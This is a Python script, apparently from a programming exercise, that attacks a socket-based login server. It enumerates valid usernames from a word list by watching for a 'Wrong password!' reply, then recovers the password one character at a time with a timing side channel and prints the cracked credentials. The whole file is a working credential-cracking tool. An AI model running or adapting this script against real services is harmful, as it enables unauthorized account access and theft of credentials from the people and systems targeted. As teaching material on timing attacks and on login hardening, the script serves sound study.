import sys
import socket
import json
import string
import time


def list_cleaning(file_txt_name):
    """Reads file and create a list of string in it without obsolete chars"""
    with open(file_txt_name, 'r') as file:
        file_list = file.readlines()
        return [k[:-1] for k in file_list]


def valid_login(login_list):
    """Returns a valid login from the login list"""
    for x in login_list:
        pair = json.dumps({"login": x, "password": ""})
        sock.send(pair.encode())
        resp = json.loads(sock.recv(1024))
        if resp == {'result': 'Wrong password!'}:
            return x


def connection(ip, ports):
    """Connect to the server by ip address and a port number"""
    adrs = (ip, int(ports))
    sock.connect(adrs)


args = sys.argv
pass_symbols = string.ascii_letters + string.digits
logins_clean = list_cleaning('logins.txt')
with socket.socket() as sock:
    connection(args[1], args[2])
    login = valid_login(logins_clean)
    pswrd = ''
    cond = True
    d = 0
    while cond:
        for j in pass_symbols:
            append = pswrd + j
            pair_log = json.dumps({"login": login, "password": append})
            try:
                sock.send(pair_log.encode())
            except BrokenPipeError:
                pass
            else:
                start = time.perf_counter()
                try:
                    response = json.loads(sock.recv(1024))
                except json.decoder.JSONDecodeError:
                    pass
                else:
                    end = time.perf_counter()
                    total = round((end - start) * 1000, 0)
                    if total >= 90.0:
                        pswrd += j
                    elif response == {"result": "Connection success!"}:
                        print(json.dumps({"login": login, "password": append}))
                        cond = False
